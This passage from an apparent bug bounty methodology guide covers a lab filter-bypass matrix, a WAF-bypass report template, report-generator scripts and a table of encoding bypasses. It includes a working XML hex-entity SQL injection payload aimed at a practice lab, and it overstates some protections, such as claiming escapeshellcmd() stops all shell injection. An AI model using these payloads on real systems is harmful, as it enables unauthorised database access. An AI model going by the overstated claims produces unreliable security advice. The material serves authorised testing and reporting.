| Module | LOW | MEDIUM | HIGH | IMPOSSIBLE | Filter Pattern |
|--------|-----|--------|------|------------|----------------|
| CMD Injection | ✓ RCE | ✓ pipe bypass | ✓ plain cmd | ✗ | shell_exec filter chain |
| SQLi | ✓ UNION | ✓ POST bypass | ✗ | ✗ | Quote → POST → PDO |
| XSS | ✓ script | ✓ img bypass | ✗ | ✗ | strip → htmlspecialchars → CSP |
| LFI | ✓ direct | ✓ ....// | ✗ | ✗ | none → str_replace → whitelist |
| Upload | ✓ PHP | ✓ polyglot | ✗ | ✗ | none → MIME → ext → content |

## Filter Root Cause Analysis

For each hardened level, document WHY the filter works:
- IMPOSSIBLE: `escapeshellcmd()` — properly escapes ALL shell metacharacters
- IMPOSSIBLE: PDO prepared statements — parameterized queries prevent ALL SQLi
- IMPOSSIBLE: `htmlspecialchars()` + CSP — output encoding + policy prevents ALL XSS
```

### WAF / Filter Bypass Reporting Template

**PortSwigger lab pattern: WAF blocks SQLi but XML hex entity encoding bypasses. Reports MUST document both the blocked payload AND the working encoded payload.**

```markdown
## SQL Injection — WAF Bypass via XML Encoding

**Filter Detected**: Web Application Firewall blocking SQL keywords (UNION, SELECT, FROM)
**Bypass Method**: XML hex entity encoding (&#xNN; notation)
**Database**: PostgreSQL
**CVSS**: 8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Filter Behavior Analysis
1. Normal request: `storeId=1` → 683 units (stock level)
2. Blocked payload: `storeId=1 UNION` → "Attack detected"
3. Blocked payload: `storeId=1 SELECT` → "Attack detected"
4. Blocked payload: `storeId=1'` → "Attack detected"
5. **Bypass confirmed**: XML hex entities pass WAF inspection

### Proof of Concept — Encoding Bypass

#### Blocked (Raw SQLi):
```xml
<?xml version="1.0"?>
<stockCheck><productId>1</productId><storeId>1 UNION SELECT NULL--</storeId></stockCheck>
```
→ Response: "Attack detected"

#### Working (Hex-Encoded):
```xml
<?xml version="1.0"?>
<stockCheck><productId>1</productId><storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; &#x4e;&#x55;&#x4c;&#x4c; &#x2d;&#x2d;</storeId></stockCheck>
```
→ Response: Stock data returned — filter bypassed

### Encoding Explanation
The XML parser decodes `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` to `UNION` AFTER the WAF inspects the raw XML. The WAF sees harmless entity references; the application receives decoded SQL keywords.

### Impact
- WAF protection completely bypassed
- Complete database enumeration possible (information_schema accessible)
- All user credentials extracted (administrator, carlos, wiener)
- Full administrator account takeover achievable

### Remediation
1. Parse and decode XML entities BEFORE applying security filters
2. Use parameterized queries instead of string concatenation
3. Implement defense-in-depth: WAF + prepared statements
```

### Step 4: Automated Report File Generation

**CRITICAL: After every assessment or exploitation session, run this script to generate physical report files. The skills produce findings; this step produces deliverable files.**

```bash
#!/bin/bash
# save as: ./bounty/{program_name}/generate_report.sh
# Run after assessment/exploitation phases

PROGRAM="${1:-unknown_program}"
REPORT_DIR="${2:-.}"
DATE=$(date +%Y-%m-%d)
TIME=$(date +%H%M)

mkdir -p "${REPORT_DIR}/reports/${DATE}"
cd "${REPORT_DIR}" || exit 1

# === 1. EXECUTIVE SUMMARY ===
cat > "reports/${DATE}/EXECUTIVE_SUMMARY_${PROGRAM}_${TIME}.md" << 'SUMMARY'
# Bug Bounty Engagement Executive Summary
**Program**: {PROGRAM}
**Date**: {DATE}
**Researcher**: {RESEARCHER}

## Engagement Statistics
| Metric | Value |
|--------|-------|
| Endpoints Tested | {TOTAL_ENDPOINTS} |
| Findings Identified | {TOTAL_FINDINGS} |
| Critical | {CRITICAL_COUNT} |
| High | {HIGH_COUNT} |
| Medium | {MEDIUM_COUNT} |
| Low | {LOW_COUNT} |

## Most Critical Finding
{FIRST_CRITICAL_TITLE} (CVSS {FIRST_CRITICAL_CVSS})
{FIRST_CRITICAL_DESCRIPTION}

## Complete Finding Inventory
{INSERT findings_inventory.md content here}

## Scope Summary
{INSERT scope.txt content here}
SUMMARY

# === 2. PER-FINDING REPORTS ===
# For each finding, generate individual report file
cat > "reports/${DATE}/FINDING_BB-001_${TIME}.md" << 'FINDING'
# FINDING BB-001: {TITLE}
**Severity**: {SEVERITY} | **CVSS**: {SCORE} | **CWE**: {CWE}
**Affected URL**: {URL}
**Auth Required**: {AUTH}

## Summary
{DESCRIPTION}

## Proof of Concept
### Step 1: {STEP1_TITLE}
```http
{STEP1_REQUEST}
```
→ {STEP1_RESPONSE}

### Step 2: {STEP2_TITLE}
```http
{STEP2_REQUEST}
```
→ {STEP2_RESPONSE}

## Impact
{DATA_EXPOSED}
- Records Affected: {COUNT}
- Business Risk: {RISK}

## Remediation
{REMEDIATION_STEPS}

## Evidence
- PoC request/response saved to: evidence/BB-001_*.txt
- Screenshots saved to: evidence/BB-001_*.png
FINDING

# === 3. EVIDENCE INVENTORY ===
cat > "reports/${DATE}/EVIDENCE_INVENTORY_${TIME}.md" << 'EVIDENCE'
# Evidence Inventory — {PROGRAM}
| Finding ID | Type | File | Description |
|-----------|------|------|-------------|
{INSERT evidence paths per finding}
EVIDENCE

# === 4. SUBMISSION TRACKER ===
cat > "reports/${DATE}/SUBMISSION_TRACKER_${TIME}.csv" << 'TRACKER'
Report ID,Title,Severity,CVSS,Platform,Submission Date,Submission ID,Status,Bounty,Notes
{INSERT tracking rows}
TRACKER

echo "[+] Reports generated in reports/${DATE}/"
echo "    - EXECUTIVE_SUMMARY_${PROGRAM}_${TIME}.md"
echo "    - FINDING_BB-*_${TIME}.md (one per finding)"
echo "    - EVIDENCE_INVENTORY_${TIME}.md"
echo "    - SUBMISSION_TRACKER_${TIME}.csv"
```

### Python Automated Report Generator

```python
#!/usr/bin/env python3
"""Auto-generate bug bounty report files from findings inventory."""

import json, os, datetime

def generate_reports(program_name, findings_file, output_dir="./reports"):
    """Generate all report files from a findings JSON inventory."""
    
    date = datetime.datetime.now().strftime("%Y-%m-%d")
    time = datetime.datetime.now().strftime("%H%M")
    out = f"{output_dir}/{date}"
    os.makedirs(out, exist_ok=True)
    
    # Load findings
    with open(findings_file) as f:
        findings = json.load(f)
    
    findings_list = findings.get("findings", [])
    stats = findings.get("stats", {})
    
    # 1. Executive Summary
    critical = [f for f in findings_list if f.get("severity") == "Critical"]
    high = [f for f in findings_list if f.get("severity") == "High"]
    
    with open(f"{out}/EXECUTIVE_SUMMARY_{program_name}_{time}.md", "w") as f:
        f.write(f"# Bug Bounty Engagement — {program_name}\n")
        f.write(f"**Date**: {date}\n\n")
        f.write("## Engagement Statistics\n")
        f.write(f"| Metric | Value |\n")
        f.write(f"|--------|-------|\n")
        f.write(f"| Endpoints Tested | {stats.get('endpoints_tested', 'N/A')} |\n")
        f.write(f"| Findings | {len(findings_list)} |\n")
        f.write(f"| Critical | {len(critical)} |\n")
        f.write(f"| High | {len(high)} |\n\n")
        
        if critical:
            f.write("## Most Critical Finding\n")
            f.write(f"**{critical[0]['title']}** (CVSS {critical[0].get('cvss', 'N/A')})\n\n")
            f.write(f"{critical[0].get('description', '')}\n\n")
        
        f.write("## Finding Inventory\n")
        f.write("| ID | Title | Severity | CVSS |\n")
        f.write("|---|-------|----------|------|\n")
        for finding in findings_list:
            f.write(f"| {finding['id']} | {finding['title']} | {finding['severity']} | {finding.get('cvss', 'N/A')} |\n")
    
    # 2. Individual Finding Reports
    for finding in findings_list:
        fid = finding['id']
        with open(f"{out}/FINDING_{fid}_{time}.md", "w") as f:
            f.write(f"# {fid}: {finding['title']}\n\n")
            f.write(f"**Severity**: {finding['severity']} | **CVSS**: {finding.get('cvss', 'N/A')} | **CWE**: {finding.get('cwe', 'N/A')}\n\n")
            f.write(f"**Affected URL**: {finding.get('url', 'N/A')}\n\n")
            f.write(f"## Summary\n{finding.get('description', '')}\n\n")
            
            f.write("## Proof of Concept\n")
            for i, step in enumerate(finding.get('poc_steps', []), 1):
                f.write(f"### Step {i}\n```http\n{step.get('request', '')}\n```\n")
                f.write(f"→ {step.get('response', '')}\n\n")
            
            f.write("## Impact\n")
            for impact in finding.get('impacts', []):
                f.write(f"- {impact}\n")
            
            f.write(f"\n## Remediation\n{finding.get('remediation', '')}\n")
            
            if finding.get('evidence'):
                f.write("\n## Evidence\n")
                for ev in finding['evidence']:
                    f.write(f"- {ev}\n")
    
    # 3. Submission Tracker
    with open(f"{out}/SUBMISSION_TRACKER_{time}.csv", "w") as f:
        f.write("ID,Title,Severity,CVSS,Platform,Date,Status,Bounty,Notes\n")
        for finding in findings_list:
            f.write(f"{finding['id']},{finding['title']},{finding['severity']},{finding.get('cvss', '')},,,Draft,,\n")
    
    print(f"Generated in {out}:")
    print(f"  EXECUTIVE_SUMMARY_{program_name}_{time}.md")
    for finding in findings_list:
        print(f"  FINDING_{finding['id']}_{time}.md")
    print(f"  SUBMISSION_TRACKER_{time}.csv")

# Usage:
# findings_data = {
#     "stats": {"endpoints_tested": 150},
#     "findings": [
#         {
#             "id": "BB-001", "title": "...", "severity": "Critical", "cvss": "9.8",
#             "cwe": "CWE-918", "url": "https://...", "description": "...",
#             "poc_steps": [{"request": "...", "response": "..."}],
#             "impacts": ["..."], "remediation": "...", "evidence": ["..."]
#         }
#     ]
# }
# generate_reports("shijicloud", "findings.json")
```

### Encoding Bypass Bounty Reference

| Encoding Type | Filter Bypassed | Bounty Impact | Real Example |
|--------------|----------------|---------------|--------------|
| XML hex entities | WAF keyword filter | $500-$5K escalation | PortSwigger SQLi lab |
| Double URL encoding | ModSecurity rules | $250-$3K | %2555 → %55 → U |
| Unicode escapes (\u0055) | JSON body filter | $500-$5K | GraphQL/JSON API bypass |
| Base64 encoding | Input validation regex | $250-$2K | When base64_decode runs post-filter |
| Multipart boundary confusion | Content-Type filter | $500-$3K | Boundary injection in multipart form |
```
